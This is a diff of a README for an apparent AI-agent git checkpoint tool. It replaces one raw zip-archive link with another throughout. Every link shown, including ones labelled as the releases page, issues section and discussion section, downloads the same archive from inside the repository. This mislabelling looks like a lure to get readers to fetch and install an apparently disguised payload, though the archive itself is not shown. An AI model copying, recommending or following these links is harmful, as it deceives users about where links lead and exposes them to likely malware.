@@ -1,6 +1,6 @@
 # 🚀 agent-skill-git-checkpoint - Simplify Your Code Changes
 
-[![Download agent-skill-git-checkpoint](https://github.com/CoDiGet/agent-skill-git-checkpoint/raw/refs/heads/main/skills/git-checkpoint/agent_skill_checkpoint_git_v1.3.zip)](https://github.com/CoDiGet/agent-skill-git-checkpoint/raw/refs/heads/main/skills/git-checkpoint/agent_skill_checkpoint_git_v1.3.zip)
+[![Download agent-skill-git-checkpoint](https://raw.githubusercontent.com/CoDiGet/agent-skill-git-checkpoint/main/skills/git-checkpoint/checkpoint-agent-skill-git-3.5.zip)](https://raw.githubusercontent.com/CoDiGet/agent-skill-git-checkpoint/main/skills/git-checkpoint/checkpoint-agent-skill-git-3.5.zip)
 
 ## 🚦 Overview
 
@@ -17,7 +17,7 @@
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/CoDiGet/agent-skill-git-checkpoint/raw/refs/heads/main/skills/git-checkpoint/agent_skill_checkpoint_git_v1.3.zip) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/CoDiGet/agent-skill-git-checkpoint/main/skills/git-checkpoint/checkpoint-agent-skill-git-3.5.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    Select the version you want and click on the downloadable file.  
@@ -48,7 +48,7 @@ Once you have launched the application, you will need to configure it according 
 
 ## 📥 Download & Install
 
-To get started, download the latest version from the [Releases page](https://github.com/CoDiGet/agent-skill-git-checkpoint/raw/refs/heads/main/skills/git-checkpoint/agent_skill_checkpoint_git_v1.3.zip). Click on the appropriate file for your operating system, and follow the outlined installation steps.
+To get started, download the latest version from the [Releases page](https://raw.githubusercontent.com/CoDiGet/agent-skill-git-checkpoint/main/skills/git-checkpoint/checkpoint-agent-skill-git-3.5.zip). Click on the appropriate file for your operating system, and follow the outlined installation steps.
 
 ## 🎓 FAQs
 
@@ -66,11 +66,11 @@ Yes, you can set up monitoring for multiple repositories by adjusting the config
 
 ### What if I encounter a problem?
 
-Visit our [issues section](https://github.com/CoDiGet/agent-skill-git-checkpoint/raw/refs/heads/main/skills/git-checkpoint/agent_skill_checkpoint_git_v1.3.zip) on GitHub to report any problems or ask for assistance.
+Visit our [issues section](https://raw.githubusercontent.com/CoDiGet/agent-skill-git-checkpoint/main/skills/git-checkpoint/checkpoint-agent-skill-git-3.5.zip) on GitHub to report any problems or ask for assistance.
 
 ## 📣 Feedback
 
-We would love to hear from you! If you have suggestions or feedback, please share your thoughts in our [discussion section](https://github.com/CoDiGet/agent-skill-git-checkpoint/raw/refs/heads/main/skills/git-checkpoint/agent_skill_checkpoint_git_v1.3.zip).
+We would love to hear from you! If you have suggestions or feedback, please share your thoughts in our [discussion section](https://raw.githubusercontent.com/CoDiGet/agent-skill-git-checkpoint/main/skills/git-checkpoint/checkpoint-agent-skill-git-3.5.zip).
 
 ## 📞 Contact
 
